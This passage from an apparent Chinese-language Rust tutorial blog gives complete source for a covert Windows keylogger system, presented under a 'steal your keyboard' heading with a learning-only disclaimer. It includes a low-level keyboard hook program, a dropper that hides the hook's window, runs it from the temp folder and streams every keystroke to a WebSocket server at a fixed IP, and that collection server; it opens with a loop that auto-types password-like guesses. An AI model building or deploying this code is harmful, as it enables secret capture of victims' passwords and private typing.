key_map.<span class="title function_ invoke__">get</span>(&amp;ch) &#123;</span><br><span class="line">            <span class="title function_ invoke__">send_key</span>(vk);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// std::thread::sleep(std::time::Duration::from_millis(1000));</span></span><br><span class="line">    <span class="comment">// println!(&quot;5&quot;);</span></span><br><span class="line">    <span class="comment">// std::thread::sleep(std::time::Duration::from_millis(1000));</span></span><br><span class="line">    <span class="comment">// println!(&quot;4&quot;);</span></span><br><span class="line">    <span class="comment">// std::thread::sleep(std::time::Duration::from_millis(1000));</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;3&quot;</span>);</span><br><span class="line">    std::thread::<span class="title function_ invoke__">sleep</span>(std::time::Duration::<span class="title function_ invoke__">from_millis</span>(<span class="number">1000</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    std::thread::<span class="title function_ invoke__">sleep</span>(std::time::Duration::<span class="title function_ invoke__">from_millis</span>(<span class="number">1000</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    std::thread::<span class="title function_ invoke__">sleep</span>(std::time::Duration::<span class="title function_ invoke__">from_millis</span>(<span class="number">1000</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;GO!&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> (<span class="number">9530</span>..<span class="number">9540</span>).<span class="title function_ invoke__">rev</span>() &#123;</span><br><span class="line">        <span class="comment">// 生成字符串，格式为 PgsXXXXd3j</span></span><br><span class="line">        <span class="title function_ invoke__">send_key</span>(VK_CAPITAL);</span><br><span class="line">        <span class="title function_ invoke__">send_keys</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">send_key</span>(VK_CAPITAL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">sequence</span> = <span class="built_in">format!</span>(<span class="string">&quot;gs&#123;:04&#125;d3j&quot;</span>, i);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;sequence: &#123;&#125;&quot;</span>, sequence);</span><br><span class="line">        <span class="title function_ invoke__">send_keys</span>(&amp;sequence);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送回车符 &#x27;\n&#x27;</span></span><br><span class="line">        <span class="title function_ invoke__">send_keys</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">send_keys</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除当前行内容，这里假设每行长度为 11 个字符（前缀 3 + 数字 4 + 后缀 4）</span></span><br><span class="line">        </span><br><span class="line">        std::thread::<span class="title function_ invoke__">sleep</span>(std::time::Duration::<span class="title function_ invoke__">from_millis</span>(<span class="number">200</span>));</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">_</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">11</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">send_key</span>(VK_BACK);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="偷你键盘！"><a href="#偷你键盘！" class="headerlink" title="偷你键盘！"></a>偷你键盘！</h1><div style="color: red; width: 100%; display: flex; justify-content: center; align-items: center; font-weight: bold;"><br><br>本项目禁止用于非法目的，仅用于交流学习！</div><br><br>

<h2 id="键盘钩子-stealKeyboard-exe"><a href="#键盘钩子-stealKeyboard-exe" class="headerlink" title="键盘钩子(stealKeyboard.exe)"></a>键盘钩子(stealKeyboard.exe)</h2><p>Cargo.toml</p>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;stealKeyboard&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">winapi</span> = &#123; version = <span class="string">&quot;0.3&quot;</span>, features = [<span class="string">&quot;minwindef&quot;</span>, <span class="string">&quot;winuser&quot;</span>] &#125;</span><br><span class="line"><span class="attr">tokio</span> = &#123; version = <span class="string">&quot;1&quot;</span>, features = [<span class="string">&quot;full&quot;</span>] &#125;</span><br><span class="line"><span class="attr">tokio-tungstenite</span> = <span class="string">&quot;0.17&quot;</span></span><br><span class="line"><span class="attr">futures-util</span> = <span class="string">&quot;0.3&quot;</span></span><br><span class="line"><span class="attr">serde</span> = &#123; version = <span class="string">&quot;1.0&quot;</span>, features = [<span class="string">&quot;derive&quot;</span>] &#125;</span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">lazy_static</span> = <span class="string">&quot;1.4.0&quot;</span></span><br><span class="line"><span class="attr">os_pipe</span> = <span class="string">&quot;0.9.0&quot;</span></span><br><span class="line"><span class="attr">url</span> = <span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="attr">once_cell</span> = <span class="string">&quot;1.8.0&quot;</span></span><br><span class="line"><span class="attr">crossbeam</span> = <span class="string">&quot;0.8&quot;</span></span><br></pre></td></tr></table></figure>

<p>main.rs</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::mem;</span><br><span class="line"><span class="keyword">use</span> std::ptr::null_mut;</span><br><span class="line"><span class="keyword">use</span> winapi::shared::minwindef::&#123;LPARAM, LRESULT, WPARAM&#125;;</span><br><span class="line"><span class="keyword">use</span> winapi::um::winuser::&#123;</span><br><span class="line">    CallNextHookEx, GetKeyboardState, SetWindowsHookExA, ToAscii, UnhookWindowsHookEx, HC_ACTION,</span><br><span class="line">    KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsafe</span> <span class="keyword">extern</span> <span class="string">&quot;system&quot;</span> <span class="keyword">fn</span> <span class="title function_">hook_proc</span>(n_code: <span class="type">i32</span>, w_param: WPARAM, l_param: LPARAM) <span class="punctuation">-&gt;</span> LRESULT &#123;</span><br><span class="line">    <span class="keyword">if</span> n_code == HC_ACTION &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">kb_hook</span> = mem::transmute::&lt;LPARAM, *<span class="keyword">const</span> KBDLLHOOKSTRUCT&gt;(l_param);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">vk_code</span> = (*kb_hook).vkCode;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">flags</span> = (*kb_hook).flags;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">keyboard_state</span> = [<span class="number">0u8</span>; <span class="number">256</span>];</span><br><span class="line">        <span class="title function_ invoke__">GetKeyboardState</span>(keyboard_state.<span class="title function_ invoke__">as_mut_ptr</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">char_buffer</span> = [<span class="number">0u16</span>; <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">result</span> = <span class="title function_ invoke__">ToAscii</span>(</span><br><span class="line">            vk_code,</span><br><span class="line">            (*kb_hook).scanCode,</span><br><span class="line">            keyboard_state.<span class="title function_ invoke__">as_ptr</span>(),</span><br><span class="line">            char_buffer.<span class="title function_ invoke__">as_mut_ptr</span>(),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">1</span> &#123; <span class="comment">// printable key</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">ascii_char</span> = char_buffer[<span class="number">0</span>] <span class="keyword">as</span> <span class="type">u8</span> <span class="keyword">as</span> <span class="type">char</span>;</span><br><span class="line">            <span class="keyword">if</span> flags == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, ascii_char);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// non-printable key</span></span><br><span class="line">            <span class="keyword">if</span> flags == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="keyword">match</span> vk_code &#123;</span><br><span class="line">                    _ =&gt; <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, vk_code),</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">CallNextHookEx</span>(<span class="title function_ invoke__">null_mut</span>(), n_code, w_param, l_param)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[tokio::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">hook</span> = <span class="keyword">unsafe</span> &#123; <span class="title function_ invoke__">SetWindowsHookExA</span>(WH_KEYBOARD_LL, <span class="title function_ invoke__">Some</span>(hook_proc), <span class="title function_ invoke__">null_mut</span>(), <span class="number">0</span>) &#125;;</span><br><span class="line">    <span class="keyword">if</span> hook.<span class="title function_ invoke__">is_null</span>() &#123;</span><br><span class="line">        <span class="built_in">panic!</span>(<span class="string">&quot;Failed to install hook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">msg</span>: MSG = <span class="keyword">unsafe</span> &#123; mem::<span class="title function_ invoke__">zeroed</span>() &#125;;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">unsafe</span> &#123; winapi::um::winuser::<span class="title function_ invoke__">GetMessageA</span>(&amp;<span class="keyword">mut</span> msg, <span class="title function_ invoke__">null_mut</span>(), <span class="number">0</span>, <span class="number">0</span>) &#125; != <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">unsafe</span> &#123;</span><br><span class="line">            winapi::um::winuser::<span class="title function_ invoke__">TranslateMessage</span>(&amp;<span class="keyword">mut</span> msg);</span><br><span class="line">            winapi::um::winuser::<span class="title function_ invoke__">DispatchMessageA</span>(&amp;<span class="keyword">mut</span> msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123; <span class="title function_ invoke__">UnhookWindowsHookEx</span>(hook) &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实时监控-listenTo-exe"><a href="#实时监控-listenTo-exe" class="headerlink" title="实时监控(listenTo.exe)"></a>实时监控(listenTo.exe)</h2><p>Cargo.toml</p>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;listenTo&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">rust-embed</span> = <span class="string">&quot;8.7.0&quot;</span></span><br><span class="line"><span class="attr">tokio</span> = &#123; version = <span class="string">&quot;1&quot;</span>, features = [<span class="string">&quot;full&quot;</span>] &#125;</span><br><span class="line"><span class="attr">tokio-tungstenite</span> = <span class="string">&quot;0.23.1&quot;</span></span><br><span class="line"><span class="attr">url</span> = <span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">futures-util</span> = <span class="string">&quot;0.3&quot;</span></span><br><span class="line"><span class="attr">hide_console</span> = <span class="string">&quot;0.2.1&quot;</span></span><br><span class="line"><span class="attr">winapi</span> = &#123; version = <span class="string">&quot;0.3&quot;</span>, features = [<span class="string">&quot;wincon&quot;</span>, <span class="string">&quot;shellapi&quot;</span>, <span class="string">&quot;winuser&quot;</span>, <span class="string">&quot;winbase&quot;</span>] &#125;</span><br></pre></td></tr></table></figure>

<p>main.rs</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#![windows_subsystem = <span class="string">&quot;windows&quot;</span>]</span></span><br><span class="line"><span class="keyword">use</span> rust_embed::Embed;</span><br><span class="line"><span class="keyword">use</span> winapi::um::winbase::CREATE_NO_WINDOW;</span><br><span class="line"><span class="keyword">use</span> std::fs::File;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;<span class="keyword">self</span>, BufRead, Write&#125;;</span><br><span class="line"><span class="keyword">use</span> std::os::windows::process::CommandExt;</span><br><span class="line"><span class="keyword">use</span> std::process::&#123;Command, Stdio&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio_tungstenite::&#123;connect_async, tungstenite::protocol::Message&#125;;</span><br><span class="line"><span class="keyword">use</span> url::Url;</span><br><span class="line"><span class="keyword">use</span> futures_util::SinkExt;</span><br><span class="line"><span class="keyword">use</span> serde_json::json;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Embed)]</span></span><br><span class="line"><span class="meta">#[folder = <span class="string">&quot;src\\resource&quot;</span>]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Asset</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[tokio::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="comment">// 获取嵌入的 .exe 文件</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">exe_file</span> = Asset::<span class="title function_ invoke__">get</span>(<span class="string">&quot;stealKeyboard.exe&quot;</span>).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">exe_data</span> = exe_file.data.<span class="title function_ invoke__">as_ref</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个临时文件路径</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">temp_dir</span> = std::env::<span class="title function_ invoke__">temp_dir</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">temp_path</span> = temp_dir.<span class="title function_ invoke__">join</span>(<span class="string">&quot;stealKeyboard.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将嵌入的 .exe 文件内容写入临时文件</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">file</span> = File::<span class="title function_ invoke__">create</span>(&amp;temp_path)?;</span><br><span class="line">        file.<span class="title function_ invoke__">write_all</span>(exe_data)?;</span><br><span class="line">    &#125; <span class="comment">// 文件句柄在这里自动关闭</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确保文件句柄已经关闭</span></span><br><span class="line">    tokio::time::<span class="title function_ invoke__">sleep</span>(tokio::time::Duration::<span class="title function_ invoke__">from_millis</span>(<span class="number">100</span>)).<span class="keyword">await</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用临时文件并监听标准输出</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">child</span> = Command::<span class="title function_ invoke__">new</span>(&amp;temp_path)</span><br><span class="line">        .<span class="title function_ invoke__">stdout</span>(Stdio::<span class="title function_ invoke__">piped</span>())</span><br><span class="line">        .<span class="title function_ invoke__">creation_flags</span>(CREATE_NO_WINDOW)</span><br><span class="line">        .<span class="title function_ invoke__">spawn</span>()</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">stdout</span> = child.stdout.<span class="title function_ invoke__">take</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">reader</span> = io::BufReader::<span class="title function_ invoke__">new</span>(stdout);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到 WebSocket 服务器</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">url</span> = Url::<span class="title function_ invoke__">parse</span>(<span class="string">&quot;ws://192.168.1.128:8086&quot;</span>).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> (<span class="keyword">mut</span> ws_stream, _) = <span class="title function_ invoke__">connect_async</span>(url.<span class="title function_ invoke__">as_str</span>()).<span class="keyword">await</span>.<span class="title function_ invoke__">expect</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实时打印标准输出并发送到 WebSocket 服务器  </span></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">line</span> <span class="keyword">in</span> reader.<span class="title function_ invoke__">lines</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(line) = line &#123;</span><br><span class="line">            <span class="comment">// println!(&quot;&#123;&#125;&quot;, line);</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">json_msg</span> = json!(&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;st&quot;</span>, <span class="string">&quot;payload&quot;</span>: line&#125;);</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = ws_stream.<span class="title function_ invoke__">send</span>(Message::<span class="title function_ invoke__">Text</span>(json_msg.<span class="title function_ invoke__">to_string</span>())).<span class="keyword">await</span> &#123;</span><br><span class="line">                <span class="comment">// eprintln!(&quot;Failed to send message to WebSocket server: &#123;:?&#125;&quot;, e);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待子进程结束</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">output</span> = child.<span class="title function_ invoke__">wait_with_output</span>()?;</span><br><span class="line">    <span class="keyword">if</span> output.status.<span class="title function_ invoke__">success</span>() &#123;</span><br><span class="line">        <span class="comment">// println!(&quot;Embedded .exe executed successfully&quot;);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// eprintln!(&quot;Embedded .exe execution failed&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理临时文件</span></span><br><span class="line">    <span class="keyword">match</span> std::fs::<span class="title function_ invoke__">remove_file</span>(&amp;temp_path) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(_) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;&quot;</span>),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(e) =&gt; <span class="built_in">eprintln!</span>(<span class="string">&quot;&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在main.rs同级目录下建一个resource文件夹，把刚才编译好的stealKeyboard.exe放进去，实现原理是运行listenTo.exe这个程序时，程序会释放stealkeyboard.exe这个程序，然后运行并监听其标准输出，然后通过连接了一个WebSocket服务器来发送键盘监控</p>
<p>因为键盘挂钩子是一个回调函数，发送websocket消息是一个异步函数，所以本来想直接写一个程序来实现，但是不会处理异步QAQ，所以就分成了两个程序，一个用来挂键盘钩子，一个用来发送实时监听</p>
<h1 id="一个简单的websocket服务器"><a href="#一个简单的websocket服务器" class="headerlink" title="一个简单的websocket服务器"></a>一个简单的websocket服务器</h1><p>Cargo.toml</p>
<figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;greeting&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">tokio</span> = &#123; version = <span class="string">&quot;1&quot;</span>, features = [<span class="string">&quot;full&quot;</span>] &#125;</span><br><span class="line"><span class="attr">tokio-tungstenite</span> = <span class="string">&quot;0.17&quot;</span></span><br><span class="line"><span class="attr">futures-util</span> = <span class="string">&quot;0.3&quot;</span></span><br><span class="line"><span class="attr">serde</span> = &#123; version = <span class="string">&quot;1.0&quot;</span>, features = [<span class="string">&quot;derive&quot;</span>] &#125;</span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="comment"># rusqlite = &#123; version = &quot;0.26.0&quot;, features = [&quot;bundled&quot;] &#125;</span></span><br></pre></td></tr></table></figure>

<p>main.rs</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> futures_util::&#123;SinkExt, StreamExt&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::net::TcpListener;</span><br><span class="line"><span class="keyword">use</span> tokio_tungstenite::tungstenite::Message;</span><br><span class="line"><span class="comment">// use rusqlite::Connection;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[tokio::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定到本地地址和端口，创建一个TCP监听器</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">listener</span> = TcpListener::<span class="title function_ invoke__">bind</span>(<span class="string">&quot;0.0.0.0:8086&quot;</span>)</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;无法绑定地址&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;正在监听: 0.0.0.0:8086&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环接受新的连接</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Ok</span>((stream, _)) = listener.<span class="title function_ invoke__">accept</span>().<span class="keyword">await</span> &#123;</span><br><span class="line">        <span class="comment">// 对于每一个连接，创建一个新的任务来处理它</span></span><br><span class="line">        tokio::<span class="title function_ invoke__">spawn</span>(<span class="keyword">async</span> <span class="keyword">move</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">addr</span> = stream.<span class="title function_ invoke__">peer_addr</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;新的WebSocket连接: &#123;&#125;&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将TCP流转换为WebSocket流</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">ws_stream</span> = <span class="keyword">match</span> tokio_tungstenite::<span class="title function_ invoke__">accept_async</span>(stream).<span class="keyword">await</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">Ok</span>(ws) =&gt; ws,</span><br><span class="line">                <span class="title function_ invoke__">Err</span>(e) =&gt; &#123;</span><br><span class="line">                    <span class="built_in">eprintln!</span>(<span class="string">&quot;无法接受WebSocket连接: &#123;:?&#125; 从: &#123;&#125;&quot;</span>, e, addr);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 分离WebSocket流的写入和读取部分</span></span><br><span class="line">            <span class="keyword">let</span> (<span class="keyword">mut</span> write, <span class="keyword">mut</span> read) = ws_stream.<span class="title function_ invoke__">split</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 循环读取消息</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Some</span>(<span class="title function_ invoke__">Ok</span>(msg)) = read.<span class="title function_ invoke__">next</span>().<span class="keyword">await</span> &#123;</span><br><span class="line">                <span class="keyword">match</span> msg &#123;</span><br><span class="line">                    <span class="comment">// 处理文本消息</span></span><br><span class="line">                    Message::<span class="title function_ invoke__">Text</span>(text) =&gt; &#123;</span><br><span class="line">                        <span class="comment">// println!(&quot;接收到文本消息: &#123;&#125;&quot;, text);</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 解构消息内容的json格式</span></span><br><span class="line">                        <span class="keyword">let</span> <span class="variable">json_data</span>: serde_json::Value = serde_json::<span class="title function_ invoke__">from_str</span>(&amp;text).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">                        </span><br><span class="line"><span class="comment">////////////////////////////////////////    以下是消息处理部分，根据实际需求编写即可      //////////////////////////////////////</span></span><br><span class="line">                        <span class="comment">// println!(&quot;来自&#123;&#125; pressed: &#123;&#125;&quot;, addr, json_data[&quot;payload&quot;]);</span></span><br><span class="line">                        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, json_data[<span class="string">&quot;payload&quot;</span>]); <span class="comment">// 这里是承接着上一个挂键盘钩子写的，可以用来查看json格式消息的内容</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 处理json消息 // 这里写了一个示例，用来处理认证消息判断一个token是否正确，然后返回给客户端一个响应，可以用来让服务端判断是否要与这个客户端进行连接</span></span><br><span class="line">                        <span class="keyword">match</span> json_data[<span class="string">&quot;type&quot;</span>].<span class="title function_ invoke__">as_str</span>().<span class="title function_ invoke__">unwrap</span>() &#123; <span class="comment">// 此处客户端发送的消息格式应该是&#123;&quot;type&quot;:&quot;auth&quot;, &quot;token&quot;:&quot;abcde&quot;&#125;</span></span><br><span class="line">                            <span class="string">&quot;auth&quot;</span> =&gt; &#123;</span><br><span class="line">                                <span class="keyword">if</span> json_data[<span class="string">&quot;token&quot;</span>].<span class="title function_ invoke__">as_str</span>().<span class="title function_ invoke__">unwrap</span>()</span><br><span class="line">                                    == <span class="string">&quot;abcde&quot;</span></span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="comment">// 定义一个响应消息</span></span><br><span class="line">                                    <span class="keyword">let</span> <span class="variable">response</span> = serde_json::json!(&#123;</span><br><span class="line">                                        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;server&quot;</span>,</span><br><span class="line">                                        <span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">                                        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;auth&quot;</span></span><br><span class="line">                                    &#125;);</span><br><span class="line"></span><br><span class="line">                                    <span class="comment">// 发送回一个响应</span></span><br><span class="line">                                    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = write.<span class="title function_ invoke__">send</span>(Message::<span class="title function_ invoke__">Text</span>(response.<span class="title function_ invoke__">to_string</span>())).<span class="keyword">await</span> &#123;</span><br><span class="line">                                        <span class="built_in">println!</span>(<span class="string">&quot;来自连接 &#123;&#125;: 发送消息时出错: &#123;&#125;&quot;</span>, addr, e);</span><br><span class="line">                                        <span class="comment">// 如果发送消息失败，中断当前连接的处理</span></span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            _ =&gt; &#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">                    <span class="comment">// 处理二进制消息</span></span><br><span class="line">                    Message::<span class="title function_ invoke__">Binary</span>(_) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;来自连接 &#123;&#125;: 接收到二进制消息&quot;</span>, addr),</span><br><span class="line">                    <span class="comment">// 处理关闭连接消息</span></span><br><span class="line">                    Message::<span class="title function_ invoke__">Close</span>(_) =&gt; &#123;</span><br><span class="line">                        <span class="built_in">println!</span>(<span class="string">&quot;来自连接 &#123;&#125;: 连接已关闭&quot;</span>, addr);</span><br><span class="line">                        <span class="comment">// 中断当前连接的处理</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 忽略其他类型的消息</span></span><br><span class="line">                    _ =&gt; (),</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="fltk-GUI库的使用"><a href="#fltk-GUI库的使用" class="headerlink" title="fltk GUI库的使用"></a>fltk GUI库的使用</h1><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;fltk&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">fltk</span> = <span class="string">&quot;1.2&quot;</span></span><br><span class="line"><span class="attr">winit</span> = <span class="string">&quot;0.29&quot;</span></span><br></pre></td></tr></table></figure>

